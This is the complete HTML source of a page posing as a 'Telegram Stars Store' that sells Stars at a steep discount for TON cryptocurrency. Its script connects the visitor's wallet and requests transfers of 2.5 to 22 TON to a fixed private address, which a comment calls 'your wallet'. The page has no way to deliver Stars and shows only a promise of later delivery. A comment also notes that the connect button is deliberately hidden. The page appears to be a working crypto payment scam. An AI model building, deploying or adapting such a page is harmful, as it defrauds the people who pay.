<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stars Store</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0b0b0b; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        header { text-align: center; margin-bottom: 25px; }
        .stars-title { color: #f7d54e; font-size: 22px; font-weight: bold; margin-top: 10px; }
        
        .packages-list { width: 100%; max-width: 380px; display: flex; flex-direction: column; gap: 12px; }
        .package-item { background: #1a1a1a; border: 1px solid #333; border-radius: 16px; padding: 18px; display: flex; justify-content: space-between; align-items: center; transition: 0.2s; cursor: pointer; }
        .package-item:active { transform: scale(0.98); background: #222; }
        
        .stars-info { display: flex; flex-direction: column; text-align: left; }
        .stars-amount { font-weight: bold; font-size: 17px; color: #fff; }
        .original-price { font-size: 11px; color: #666; text-decoration: line-through; }
        
        .price-section { text-align: right; }
        .ton-price { color: #00d4ff; font-weight: bold; font-size: 15px; margin-bottom: 5px; }
        .buy-label { font-size: 11px; color: #fff; background: #0088cc; padding: 4px 10px; border-radius: 6px; }

        #ton-connect-button { margin-top: 25px; opacity: 0.6; } /* الزر مخفي تحت للتوثيق فقط */
        .secure-tag { margin-top: 30px; font-size: 10px; color: #444; display: flex; align-items: center; gap: 5px; }
    </style>
</head>
<body>

    <header>
        <img src="https://ton.org/pics/ton_logo.purp.png" width="45">
        <div class="stars-title">Telegram Stars Store</div>
        <p style="color: #888; font-size: 12px;">Exclusive 40% Discount for TON Users</p>
    </header>

    <div class="packages-list">
        <div class="package-item" onclick="handlePurchase(2.5, '1,000')">
            <div class="stars-info">
                <span class="stars-amount">⭐️ 1,000 Stars</span>
                <span class="original-price">$25.00</span>
            </div>
            <div class="price-section">
                <div class="ton-price">2.5 TON</div>
                <span class="buy-label">Buy</span>
            </div>
        </div>

        <div class="package-item" style="border-color: #f7d54e;" onclick="handlePurchase(12, '5,000')">
            <div class="stars-info">
                <span class="stars-amount">⭐️ 5,000 Stars <small style="color: #f7d54e; font-size: 9px; margin-left:5px;">POPULAR</small></span>
                <span class="original-price">$125.00</span>
            </div>
            <div class="price-section">
                <div class="ton-price">12 TON</div>
                <span class="buy-label" style="background: #f7d54e; color: black;">Buy</span>
            </div>
        </div>

        <div class="package-item" onclick="handlePurchase(22, '10,000')">
            <div class="stars-info">
                <span class="stars-amount">⭐️ 10,000 Stars</span>
                <span class="original-price">$250.00</span>
            </div>
            <div class="price-section">
                <div class="ton-price">22 TON</div>
                <span class="buy-label">Buy</span>
            </div>
        </div>
    </div>

    <div id="ton-connect-button"></div>
    <div class="secure-tag">🛡️ Secured by TON Connect 2.0 Node</div>

    <script>
        // إعداد الربط بدون فتح تلقائي للمودال
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        async function handlePurchase(amountInTon, label) {
            // 1. إذا لم تكن المحفظة متصلة، نفتح المودال فوراً
            if (!tonConnectUI.connected) {
                await tonConnectUI.openModal();
                return; // ننتظر حتى يربط المستخدم أولاً
            }

            // 2. إذا كانت متصلة، نرسل طلب الدفع فوراً للمبلغ المحدد
            const nanoAmount = (amountInTon * 1000000000).toString();
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
                    amount: nanoAmount,
                    payload: btoa("Purchase " + label + " Stars")
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Order submitted! Stars will be sent to your Telegram ID after confirmation.");
            } catch (e) {
                console.error("User rejected:", e);
            }
        }
    </script>
</body>
</html>
